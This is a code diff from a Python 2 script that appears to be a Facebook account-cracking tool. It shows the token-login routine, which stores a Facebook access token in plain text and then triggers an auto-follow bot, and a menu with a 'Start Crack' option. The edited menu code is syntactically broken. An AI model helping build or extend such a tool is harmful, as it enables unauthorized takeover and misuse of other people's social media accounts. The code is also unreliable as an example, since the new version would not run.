@@ -131,20 +131,23 @@ def logs():
     logs()
 
 def log_token():
-        os.system("clear")
-        banner()
-	data = raw_input("\n   [•] Token : ")
-	try:
-		me = requests.get('https://graph.facebook.com/me?access_token='+data)
-		a = json.loads(me.text)
-		nama = a['name']
-		open("login.txt",'w').write(data)
-		print("\n   [•] Login Success")
-		bot_follow()
-	except KeyError:
-		print ("\n   [!] Invalid Token")
-		logs()
-
+    os.system('clear')
+    banner()
+    toket = raw_input("\n   [•] Token : ")
+    try:
+        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
+        a = json.loads(otw.text)
+        nama = a['name']
+        zedd = open('login.txt', 'w')
+        zedd.write(toket)
+        zedd.close()
+        print('\n   [•] Login Successful')
+        bot_follow()
+    except KeyError:
+        print ("   [!] Token Invalid")
+        os.system('clear')
+        logs()
+		
 def gen():
         os.system("clear")
         banner()
@@ -210,7 +213,8 @@ def menu():
   print("   [4] Start Crack")
   print("   [0] Logout")
   r=raw_input("\n   [•] Choose : ")
-  if r=="":print("   [!] Fill In The Correct").format(R,N);menu()
+  if r=="":print("   [!] Fill In The Correct")
+    menu()
   elif r=="1":
     publik()
   elif r=="2":
